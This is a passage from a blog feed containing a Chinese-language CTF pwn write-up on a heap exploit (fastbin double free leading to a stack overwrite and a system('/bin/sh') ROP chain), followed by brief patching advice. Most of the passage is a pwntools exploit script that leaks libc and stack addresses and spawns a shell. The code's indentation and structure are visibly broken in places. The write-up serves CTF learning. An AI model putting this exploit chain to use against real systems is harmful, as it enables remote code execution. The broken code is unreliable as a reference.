class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">add(0x40,&apos;aaaaaaaa&apos;)</span><br><span class="line">add(0x40,&apos;aaaaaaaaa&apos;)</span><br><span class="line">add(0x50,&apos;aaaaa&apos;)</span><br><span class="line">add(0x40,&apos;aaaaaaa&apos;)</span><br><span class="line">rm(2)</span><br><span class="line">rm(0)</span><br><span class="line">rm(1)</span><br><span class="line">rm(0)</span><br><span class="line">raw_input(&apos;##&apos;)</span><br><span class="line">add(0x40,p64(malloc_hook-3-8+0x40))</span><br><span class="line">raw_input(&apos;##&apos;)</span><br><span class="line">add(0x40,&apos;aaa&apos;)</span><br><span class="line">add(0x40,&apos;aaa&apos;)</span><br><span class="line">try:</span><br><span class="line">        add(0x40,&apos;a&apos;*(3+8*4)+p64(stack_addr-88-0x10))</span><br><span class="line">        raw_input(&apos;11&apos;)</span><br><span class="line">except:</span><br><span class="line">        io.close()</span><br><span class="line">        io=main()</span><br><span class="line">        exploit(io)</span><br><span class="line">print &apos;heap start 0x56 you win&apos;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/06/06/top-chunk/top-chunk/main_area.png" alt=""></p><p>如图我们已经分配成功了,接下来就是任意address分配了，你可以分配到malloc_hook的位置去写one_gadget,由于本题one_gadget全无效，所以，需要控制栈，把chunk分配到栈上覆盖返回值地址就可以了</p><p><img src="/2019/06/06/top-chunk/top-chunk/shell.png" alt=""></p><p>如图，就可以getshell了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">io=None</span><br><span class="line">__author__ = &apos;3summer&apos;</span><br><span class="line">s       = lambda data            :io.send(str(data))</span><br><span class="line">sa      = lambda delim,data      :io.sendafter(str(delim), str(data))</span><br><span class="line">sl      = lambda data            :io.sendline(str(data))</span><br><span class="line">sla     = lambda delim,data      :io.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = lambda numb=4096       :io.recv(numb)</span><br><span class="line">ru      = lambda delims,drop=True:io.recvuntil(delims, drop)</span><br><span class="line">irt     = lambda                  :io.interactive()</span><br><span class="line">uu32    = lambda data            :u32(data.ljust(4, &apos;\0&apos;))</span><br><span class="line">uu64    = lambda data            :u64(data.ljust(8, &apos;\0&apos;))</span><br><span class="line"></span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">token = &apos;&apos;</span><br><span class="line">binary=&apos;./pwn&apos;</span><br><span class="line">libc=ELF(&apos;./libc.so&apos;)</span><br><span class="line">def dbg(breakpoint):</span><br><span class="line">    gdbscript = &apos;&apos;</span><br><span class="line">    elf_base = 0</span><br><span class="line">    gdbscript += &apos;b *&#123;:#x&#125;\n&apos;.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint</span><br><span class="line">    gdbscript += &apos;c\n&apos;</span><br><span class="line">    log.info(gdbscript)</span><br><span class="line">    gdb.attach(io, gdbscript)</span><br><span class="line">    time.sleep(1)</span><br><span class="line"></span><br><span class="line">def add(size,con):</span><br><span class="line">sla(&apos;choice:&apos;,1)</span><br><span class="line">sla(&apos;size&apos;,size)</span><br><span class="line">sa(&apos;inpute&apos;,con)</span><br><span class="line">def rm(index):</span><br><span class="line">sla(&apos;choice:&apos;,str(4))</span><br><span class="line">sla(&apos;index:&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def exploit(io):</span><br><span class="line">sa(&apos;name?&apos;,&apos;a&apos;*0x18)</span><br><span class="line">ru(&apos;\n&apos;)</span><br><span class="line">stack_addr=u64(ru(&apos;input&apos;)[0x18:0x18+6].ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &apos;stack_addr=&apos;+hex(stack_addr)</span><br><span class="line">sa(&apos;ID&apos;,&apos;a&apos;*8)</span><br><span class="line">ru(&apos;a&apos;*8)</span><br><span class="line">libc_base=u64(ru(&apos;\n&apos;)[0:6].ljust(8,&apos;\x00&apos;))-libc.sym[&apos;_IO_file_setbuf&apos;]-9</span><br><span class="line">malloc_hook=libc_base+libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">free_hook=libc_base+libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">system=libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">bin_sh=libc_base+0x000000000018cd57</span><br><span class="line">pop_rdi=libc_base+0x0000000000021102</span><br><span class="line">print &apos;libc=&apos;+hex(libc_base)</span><br><span class="line">add(0x40,&apos;aaaaaaaa&apos;)</span><br><span class="line">add(0x40,&apos;aaaaaaaaa&apos;)</span><br><span class="line">add(0x50,&apos;aaaaa&apos;)</span><br><span class="line">add(0x40,&apos;aaaaaaa&apos;)</span><br><span class="line">rm(2)</span><br><span class="line">rm(0)</span><br><span class="line">rm(1)</span><br><span class="line">rm(0)</span><br><span class="line">raw_input(&apos;##&apos;)</span><br><span class="line">       add(0x40,p64(malloc_hook-3-8+0x40))</span><br><span class="line">raw_input(&apos;##&apos;)</span><br><span class="line">add(0x40,&apos;aaa&apos;)</span><br><span class="line">add(0x40,&apos;aaa&apos;)</span><br><span class="line">try:</span><br><span class="line">add(0x40,&apos;a&apos;*(3+8*4)+p64(stack_addr-88-0x10))</span><br><span class="line">except:</span><br><span class="line">io.close()</span><br><span class="line">io=main()</span><br><span class="line">exploit(io)</span><br><span class="line">print &apos;heap start 0x56 you win&apos;</span><br><span class="line">raw_input(&apos;###&apos;)</span><br><span class="line">add(0x30,p64(pop_rdi)+p64(bin_sh)+p64(system))</span><br><span class="line">def main(argv=None):</span><br><span class="line">global io</span><br><span class="line">if argv==None:</span><br><span class="line">argv=sys.argv</span><br><span class="line">if len(argv) &gt; 2:</span><br><span class="line">        io = remote(sys.argv[1], sys.argv[2])</span><br><span class="line">return io</span><br><span class="line"> else:</span><br><span class="line">        io = process(binary)</span><br><span class="line">if len(argv)&gt;1:</span><br><span class="line">                gdb.attach(io,&apos;directory /home/pwn/libc/glibc-2.23/malloc/&apos;)</span><br><span class="line">return io</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    io= main()</span><br><span class="line">    exploit(io)</span><br><span class="line">    irt()</span><br></pre></td></tr></table></figure><h2 id="fix-it"><a href="#fix-it" class="headerlink" title="fix it"></a>fix it</h2><p>这个漏洞攻击完了但是如何修复呢？</p><p>ida的keypatch插件很好用，一般的话程序的.eh_frame段，一般程序运行的话，不需要这一段的数据，在这一段找一小段没有被引用的段写入汇编程序，然后就可以fix好了</p><p>对于这个题目只需要把指针置0就可以了,本题只需要jmp一小段汇编程序即可<br><img src="/2019/06/06/top-chunk/top-chunk/patch.png" alt=""></p><p><img src="/2019/06/06/top-chunk/top-chunk/patch1.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      最近参加了花东北赛区的线下赛，第一次参加线下赛有点紧张，所以，成绩不太好，但是学到一个top chunk的利用的思路，在此分享
    
    </summary>
    
    
    
      <category term="ctf,pwn" scheme="http://yoursite.com/tags/ctf-pwn/"/>
    
  </entry>
  
</feed>
